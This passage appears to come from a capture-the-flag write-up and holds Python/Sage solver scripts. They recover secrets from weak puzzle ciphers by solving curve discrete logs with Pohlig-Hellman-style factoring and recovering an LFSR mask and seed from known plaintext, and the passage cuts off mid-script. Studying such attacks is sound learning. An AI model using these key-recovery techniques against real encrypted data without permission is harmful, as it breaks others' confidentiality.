</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>a</span> <span class=o>==</span> <span class=n>other</span><span class=o>.</span><span class=n>a</span> <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span> <span class=o>==</span> <span class=n>other</span><span class=o>.</span><span class=n>b</span> <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span> <span class=o>==</span> <span class=n>other</span><span class=o>.</span><span class=n>p</span> \
</span></span><span class=line><span class=cl>            <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>x</span> <span class=o>==</span> <span class=n>other</span><span class=o>.</span><span class=n>x</span> <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>y</span> <span class=o>==</span> <span class=n>other</span><span class=o>.</span><span class=n>y</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__hash__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>md5</span><span class=p>((</span><span class=s2>&#34;</span><span class=si>%d</span><span class=s2>-</span><span class=si>%d</span><span class=s2>-</span><span class=si>%d</span><span class=s2>-</span><span class=si>%d</span><span class=s2>-</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>x</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>y</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>invert</span><span class=p>(</span><span class=n>P</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>SpecialCurvePoint</span><span class=p>(</span><span class=n>P</span><span class=o>.</span><span class=n>p</span><span class=p>,</span> <span class=n>P</span><span class=o>.</span><span class=n>a</span><span class=p>,</span> <span class=n>P</span><span class=o>.</span><span class=n>b</span><span class=p>,</span> <span class=n>P</span><span class=o>.</span><span class=n>x</span><span class=p>,</span> <span class=o>-</span><span class=n>P</span><span class=o>.</span><span class=n>y</span> <span class=o>%</span> <span class=n>P</span><span class=o>.</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>P1</span><span class=p>,</span> <span class=n>P2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>P1</span> <span class=o>+</span> <span class=n>P2</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>problem3</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>curve</span><span class=o>=</span><span class=n>SpecialCurve</span><span class=p>(</span><span class=mi>52373730653143623993722188411805072409768054271090317191163373082830382186155222057388907031638565243831629283127812681929449631957644692314271061305360051</span><span class=p>,</span><span class=mi>28655236915186704327844312279364325861102737672471191366040478446302230316126579253163690638394777612892597409996413924040027276002261574013341150279408716</span><span class=p>,</span><span class=mi>42416029226399083779760024372262489355327595236815424404537477696856946194575702884812426801334149232783155054432357826688204061261064100317825443760789993</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>G</span><span class=o>=</span><span class=n>curve</span><span class=p>(</span><span class=mi>15928930551986151950313548861530582114536854007449249930339281771205424453985946290830967245733880747219865184207937142979512907006835750179101295088805979</span><span class=p>,</span> <span class=mi>29726385672383966862722624018664799344530038744596171136235079529609085682764414035677068447708040589338778102975312549905710028842378574272316925268724240</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Q</span><span class=o>=</span><span class=n>curve</span><span class=p>(</span><span class=mi>38121552296651560305666865284721153617113944344833289618523344614838728589487183141203437711082603199613749216407692351802119887009907921660398772094998382</span><span class=p>,</span> <span class=mi>26933444836972639216676645467487306576059428042654421228626400416790420281717654664520663525738892984862698457685902674487454159311739553538883303065780163</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=mi>52373730653143623993722188411805072409768054271090317191163373082830382186155222057388907031638565243831629283127812681929449631957644692314271061305360051</span>
</span></span><span class=line><span class=cl>    <span class=n>E</span> <span class=o>=</span> <span class=n>curve</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>order</span> <span class=o>=</span> <span class=n>p</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>factors</span> <span class=o>=</span> <span class=p>[</span><span class=mi>4</span><span class=p>,</span> <span class=mi>2663</span><span class=p>,</span> <span class=mi>5039</span><span class=p>,</span> <span class=mi>14759</span><span class=p>,</span> <span class=mi>18803</span><span class=p>,</span> <span class=mi>21803</span><span class=p>,</span> <span class=mi>22271</span><span class=p>,</span> <span class=mi>22307</span><span class=p>,</span> <span class=mi>23879</span><span class=p>,</span> <span class=mi>26699</span><span class=p>,</span> <span class=mi>35923</span><span class=p>,</span> <span class=mi>42727</span><span class=p>,</span> <span class=mi>48989</span><span class=p>,</span> <span class=mi>52697</span><span class=p>,</span> <span class=mi>57773</span><span class=p>,</span> <span class=mi>58129</span><span class=p>,</span> <span class=mi>60527</span><span class=p>,</span> <span class=mi>66877</span><span class=p>,</span> <span class=mi>69739</span><span class=p>,</span> <span class=mi>74363</span><span class=p>,</span> <span class=mi>75869</span><span class=p>,</span> <span class=mi>79579</span><span class=p>,</span> <span class=mi>80489</span><span class=p>,</span> <span class=mi>81043</span><span class=p>,</span> <span class=mi>81049</span><span class=p>,</span> <span class=mi>82531</span><span class=p>,</span> <span class=mi>84509</span><span class=p>,</span> <span class=mi>85009</span><span class=p>,</span> <span class=mi>91571</span><span class=p>,</span> <span class=mi>96739</span><span class=p>,</span> <span class=mi>98711</span><span class=p>,</span> <span class=mi>102481</span><span class=p>,</span> <span class=mi>103357</span><span class=p>,</span> <span class=mi>103981</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ans</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>factor</span> <span class=ow>in</span> <span class=n>factors</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>this</span> <span class=o>=</span> <span class=n>bsgs</span><span class=p>(</span><span class=n>G</span> <span class=o>*</span> <span class=p>(</span><span class=n>order</span> <span class=o>//</span> <span class=n>factor</span><span class=p>),</span> <span class=n>Q</span> <span class=o>*</span> <span class=p>(</span><span class=n>order</span> <span class=o>//</span> <span class=n>factor</span><span class=p>),</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>factor</span><span class=p>),</span> <span class=n>operation</span><span class=o>=</span><span class=s1>&#39;other&#39;</span><span class=p>,</span> <span class=n>op</span><span class=o>=</span><span class=n>add</span><span class=p>,</span> <span class=n>inverse</span><span class=o>=</span><span class=n>invert</span><span class=p>,</span> <span class=n>identity</span><span class=o>=</span><span class=n>E</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ans</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>this</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>this</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>crt</span><span class=p>(</span><span class=n>ans</span><span class=p>,</span> <span class=n>factors</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>problem2</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>y1</span> <span class=o>=</span> <span class=mi>96989919722797171541882834089135074413922451043302800296198062675754293402989</span>
</span></span><span class=line><span class=cl>    <span class=n>yn</span> <span class=o>=</span> <span class=mi>110661224324697604640962229701359894201176516005657224773855350780007949687952</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=mi>191068609532021291665270648892101370598912795286064024735411416824693692132923</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>yn</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>y1</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span> <span class=o>%</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>problem1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=mi>233083587295210134948821000868826832947</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=mi>73126617271517175643081276880688551524</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=mi>88798574825442191055315385745016140538</span>
</span></span><span class=line><span class=cl>    <span class=n>D</span> <span class=o>=</span> <span class=p>(</span><span class=n>Mod</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span><span class=o>^-</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>nth_root</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>Map</span><span class=p>(</span><span class=n>P</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=o>=</span> <span class=n>P</span><span class=o>.</span><span class=n>x</span><span class=p>,</span> <span class=n>P</span><span class=o>.</span><span class=n>y</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>Mod</span><span class=p>((</span><span class=n>x</span> <span class=o>-</span> <span class=n>b</span> <span class=o>*</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=mi>2</span> <span class=o>*</span> <span class=n>a</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span> <span class=o>+</span> <span class=n>D</span> <span class=o>*</span> <span class=n>y</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>a</span> <span class=o>*</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=n>p</span><span class=p>),</span> <span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>curve</span><span class=o>=</span><span class=n>SpecialCurve</span><span class=p>(</span><span class=mi>233083587295210134948821000868826832947</span><span class=p>,</span><span class=mi>73126617271517175643081276880688551524</span><span class=p>,</span><span class=mi>88798574825442191055315385745016140538</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>G</span><span class=o>=</span><span class=n>curve</span><span class=p>(</span><span class=mi>183831340067417420551177442269962013567</span><span class=p>,</span> <span class=mi>99817328357051895244693615825466756115</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Q</span><span class=o>=</span><span class=n>curve</span><span class=p>(</span><span class=mi>166671516040968894138381957537903638362</span><span class=p>,</span> <span class=mi>111895361471674668502480740000666908829</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>g</span> <span class=o>=</span> <span class=n>Map</span><span class=p>(</span><span class=n>G</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>q</span> <span class=o>=</span> <span class=o>-</span><span class=n>Map</span><span class=p>(</span><span class=n>Q</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>factors</span> <span class=o>=</span> <span class=p>[</span><span class=mi>2</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>71</span><span class=p>,</span> <span class=mi>2671</span><span class=p>,</span> <span class=mi>20147</span><span class=p>,</span> <span class=mi>69341</span><span class=p>,</span> <span class=mi>146631649272726436705613</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ans</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>factor</span> <span class=ow>in</span> <span class=n>factors</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>this</span> <span class=o>=</span> <span class=n>bsgs</span><span class=p>(</span><span class=n>g</span> <span class=o>**</span> <span class=p>(</span><span class=n>order</span> <span class=o>//</span> <span class=n>factor</span><span class=p>),</span> <span class=n>q</span> <span class=o>**</span> <span class=p>(</span><span class=n>order</span> <span class=o>//</span> <span class=n>factor</span><span class=p>),</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>factor</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>ans</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>this</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>this</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ans</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=mi>71440828573593354113865</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>crt</span><span class=p>(</span><span class=n>ans</span><span class=p>,</span> <span class=n>factors</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e1</span> <span class=o>=</span> <span class=n>problem1</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>e2</span> <span class=o>=</span> <span class=n>problem2</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>e3</span> <span class=o>=</span> <span class=n>problem3</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=mi>4161358072766336252252471282975567407131586510079023869994510082082055094259455767245295677764252219353961906640516887754903722158044643700643524839069337</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>bytes_to_long</span><span class=p>(</span><span class=n>hashlib</span><span class=o>.</span><span class=n>sha512</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=si>%d</span><span class=s1>-</span><span class=si>%d</span><span class=s1>-</span><span class=si>%d</span><span class=s1>&#39;</span><span class=o>%</span><span class=p>(</span><span class=n>e1</span><span class=p>,</span><span class=n>e2</span><span class=p>,</span><span class=n>e3</span><span class=p>))</span><span class=o>.</span><span class=n>digest</span><span class=p>())</span> <span class=o>^^</span> <span class=n>enc</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=ez_pager_tiper>Ez_Pager_Tiper</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>tqdm</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>magic_box</span> <span class=kn>import</span> <span class=n>lfsr</span><span class=p>,</span> <span class=n>generator</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gauss</span><span class=p>(</span><span class=n>mat</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>mat</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>mat</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>mat</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>mat</span><span class=p>[</span><span class=n>j</span><span class=p>][</span><span class=n>i</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>mat</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>mat</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>mat</span><span class=p>[</span><span class=n>j</span><span class=p>],</span> <span class=n>mat</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>mat</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=n>j</span> <span class=ow>or</span> <span class=n>mat</span><span class=p>[</span><span class=n>j</span><span class=p>][</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>mat</span><span class=p>[</span><span class=n>i</span><span class=p>])):</span>
</span></span><span class=line><span class=cl>                <span class=n>mat</span><span class=p>[</span><span class=n>j</span><span class=p>][</span><span class=n>k</span><span class=p>]</span> <span class=o>^=</span> <span class=n>mat</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>k</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>mat</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n1</span><span class=p>,</span> <span class=n>n2</span> <span class=o>=</span> <span class=mi>64</span><span class=p>,</span> <span class=mi>12</span>
</span></span><span class=line><span class=cl><span class=n>plain_2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;Date: 1984-04-01&#39;</span>
</span></span><span class=line><span class=cl><span class=n>cip_2</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;MTk4NC0wNC0wMQ==_6d30.enc&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>bit_list</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>plain_2</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>bit_list</span> <span class=o>+=</span> <span class=nb>bin</span><span class=p>(</span><span class=n>plain_2</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>cip_2</span><span class=p>[</span><span class=n>i</span><span class=p>])[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mat</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>bit_list</span><span class=p>)</span> <span class=o>-</span> <span class=n>n2</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>rol</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n2</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>rol</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>bit_list</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=n>mat</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>rol</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mat</span> <span class=o>=</span> <span class=n>gauss</span><span class=p>(</span><span class=n>mat</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mask2</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>mask2</span> <span class=o>=</span> <span class=n>mask2</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=n>mat</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>mask_list</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=n>mask2</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=n>n2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>seed_list</span> <span class=o>=</span> <span class=n>bit_list</span><span class=p>[:</span><span class=n>n2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>seed_list</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n2</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>mask_list</span><span class=p>[</span><span class=n>j</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>^=</span> <span class=nb>int</span><span class=p>(</span><span class=n>seed_list</span><span class=p>[</span><span class=n>j</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>seed_list</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>res</span><span class=p>)</span> <span class=o>+</span> <span class=n>seed_list</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>seed2</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>seed_list</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>seed2</span><span class=p>,</span> <span class=n>mask2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>plain_1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;Date: 1984-12-25</span><span class=se>\r\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>cip_1</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;MTk4NC0xMi0yNQ==_76ff.enc&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>bit_list_base</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>plain_1</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>bit_list_base</span> <span class=o>+=</span> <span class=nb>bin</span><span class=p>(</span><span class=n>plain_1</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>cip_1</span><span class=p>[</span><span class=n>i</span><span class=p>])[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>seed3</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span> <span class=o>**</span> <span class=mi>12</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>lfit</span> <span class=o>=</span> <span class=n>lfsr</span><span class=p>(</span><span class=n>seed3</span><span class=p>,</span> <span class=n>mask2</span><span class=p>,</span> <span class=n>n2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>bit_list_mask</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>bit_list_base</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>bit_list_mask</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>lfit</span><span class=o>.</span><span class=n>getrandbit</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>bit_list</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>bit_list_base</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>bit_list</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>bit_list_base</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>^</span> <span class=nb>int</span><span class=p>(</span><span class=n>bit_list_mask</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>mat</span> <span class=o>=</span> <span class=p>[]</span>
